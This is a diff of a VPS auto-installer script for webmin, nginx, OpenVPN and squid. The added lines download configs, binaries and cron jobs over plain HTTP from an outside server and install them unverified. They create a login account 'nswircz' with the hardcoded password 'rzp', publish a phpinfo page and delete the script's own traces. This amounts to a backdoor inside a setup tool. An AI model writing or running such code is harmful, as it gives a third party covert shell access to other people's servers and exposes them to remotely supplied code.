@@ -74,15 +74,36 @@ echo 'menu' >> .bashrc
 apt-get -y install webmin
 sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
 
-# install webserver
-cd
+# nginx
+apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/MuLuu09/conf/master/nginx.conf"
+wget -O /etc/nginx/nginx.conf "http://files.rzvpn.net/rz/nginx.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by oxide@cyox.ga</pre>" > /home/vps/public_html/index.html
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/MuLuu09/conf/master/vps.conf"
-service nginx restart
+echo "<pre>Setup by meow | telegram @nswircz | whatsapp +60176218006</pre>" > /home/vps/public_html/index.php
+echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+wget -O /etc/nginx/conf.d/vps.conf "http://files.rzvpn.net/rz/vps.conf"
+sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
+# openvpn
+apt-get -y install openvpn
+cd /etc/openvpn/
+wget http://files.rzvpn.net/rz/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "http://files.rzvpn.net/rz/iptables.up.rules"
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn "http://files.rzvpn.net/rz/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget http://files.rzvpn.net/rz/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash nswircz
+echo "nswircz:rzp" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
 
 # Install BadVPN
 apt-get -y install cmake make gcc
@@ -186,16 +207,6 @@ wget -O /etc/squid3/squid.conf "https://github.com/SSL3/FluxoScript/raw/master/s
 sed -i $MYIP2 /etc/squid3/squid.conf;
 service squid3 restart
 
-#bonus block torrent
-wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/torrent.sh
-chmod +x torrent.sh
-./torrent.sh
-
-# bovpn
-cd
-wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/installvpn
-chmod +x installvpn
-./installvpn
 
 # color text
 cd
